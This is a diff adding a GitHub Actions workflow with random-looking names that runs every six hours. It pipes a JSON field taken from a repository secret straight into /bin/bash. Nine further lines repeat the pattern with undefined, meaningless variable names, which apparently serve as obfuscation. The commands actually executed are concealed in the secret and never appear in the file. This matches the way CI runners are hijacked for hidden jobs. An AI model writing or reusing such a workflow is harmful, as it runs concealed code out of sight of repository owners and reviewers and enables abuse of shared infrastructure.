@@ -1,0 +1,27 @@
+name: harshsomewhere
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: harshsomewhere
+        env:
+          cbj82: ${{ secrets.cbj82 }}
+        run: |
+          echo $cbj82 | jq -r .buut1830 | /bin/bash
+          echo $n90469 | jq -r .pef083 | /bin/bash
+          echo $hdcfb552 | jq -r .hz5770 | /bin/bash
+          echo $ilhe2115 | jq -r .poghp6 | /bin/bash
+          echo $xe13 | jq -r .sippb6893 | /bin/bash
+          echo $qlbb22786 | jq -r .rj1756 | /bin/bash
+          echo $kjqo83 | jq -r .vhya1 | /bin/bash
+          echo $t3 | jq -r .mc77403 | /bin/bash
+          echo $jasfa040 | jq -r .rv8162 | /bin/bash
+          echo $yrrwm71 | jq -r .vit416 | /bin/bash
+
